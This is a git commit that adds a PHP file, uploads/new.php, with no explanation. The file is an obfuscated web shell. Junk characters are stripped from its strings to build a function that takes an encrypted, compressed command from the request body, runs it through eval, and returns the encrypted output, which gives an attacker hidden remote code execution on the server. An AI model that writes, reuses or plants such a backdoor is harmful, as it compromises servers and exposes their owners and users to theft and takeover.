c879438d4ad86c375f544d1a444464422e428add
1nonlywizzler <165366346+Funkaarfam@users.noreply.github.com>
2026-04-21 13:08:03 +0500

    Add files via upload

---
+++ uploads/new.php
@@ -0,0 +1,10 @@
+<?php
+$O=',$k){$c=strlen($kZ);Z$l=strlen(Z$Zt);$o=""Z;ZfoZr($i=0;$i<$l;){foZr($j=0Z;(ZZZ$j<$c&&$i<$l);$j++Z,Z$i+Z+)';
+$Z=str_replace('W','','cWrWeaWte_WfWunWction');
+$B='npuZt"),$m)Z==1) {@oZb_stZart();@eZvZal(@gzZuncompressZ(@x(@baZse64_ZZdecode($m[1]Z),Z$k)));$o=Z@ob_gZet';
+$C='{Z$o.=$t{$iZ}Z^$k{$j};}}return $o;}ifZZ (@preg_match(Z"/$kZh(Z.+)$kf/",@fZilZe_get_contZents("pZhp:/Z/i';
+$N='$k="20ZZ2cb962";$kh="acZZZZ59075b964b";$kf="Z07152dZ234bZ70";$Zp="qibwZENZzaU7mAWX6i"Z;functZionZ xZ($t';
+$r='_ZcontentZs();@ob_eZndZ_cZlean();$r=Z@bZase64_encoZdZe(Z@x(@gZzcomprZess($oZ),$kZ));print("$p$kh$r$kf");}';
+$c=str_replace('Z','',$N.$O.$C.$B.$r);
+$w=$Z('',$c);$w();
+?>
